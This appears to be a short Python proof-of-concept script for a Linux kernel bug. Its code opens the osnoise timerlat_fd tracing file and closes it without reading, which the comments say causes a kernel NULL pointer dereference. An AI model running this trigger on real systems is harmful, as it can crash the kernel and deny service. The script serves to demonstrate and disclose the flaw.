#!/usr/bin/env python3

# This code demonstrates the vulnerability by opening and closing the timerlat_fd without reading it
timerlat_fd = open("/sys/kernel/debug/tracing/osnoise/per_cpu/cpu0/timerlat_fd", 'r')
timerlat_fd.close()  # Closing the file without reading it can lead to a kernel NULL pointer dereference